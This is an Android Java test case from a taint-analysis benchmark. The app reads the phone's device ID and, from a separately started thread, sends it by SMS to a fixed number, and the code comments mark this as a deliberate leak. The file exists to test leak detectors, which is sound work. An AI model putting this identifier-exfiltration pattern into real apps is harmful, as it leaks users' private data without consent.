package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;

/**
 * @testcase_name Threading_JavaThread1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description Sensitive data is read in onCreate() and send out in a dedicated thread started
 *   using Java's normal threading mechanism.
 * @dataflow onCreate: source -> MyThread.run() -> sink
 * @number_of_leaks 1
 * @challenges The analysis must be able to correctly handle Java threads.
 */
public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		TelephonyManager telephonyManager = (TelephonyManager)
				getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
		new MyThread(telephonyManager.getDeviceId()).start();
	}

	private class MyThread extends Thread {
		
		private final String deviceId;
		
		public MyThread(String deviceId) {
			this.deviceId = deviceId;
		}
	    
		@Override
	    public void run() {
			SmsManager sms = SmsManager.getDefault();
			sms.sendTextMessage("+49", null, deviceId, null, null);  //sink, leak
	    }
	
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
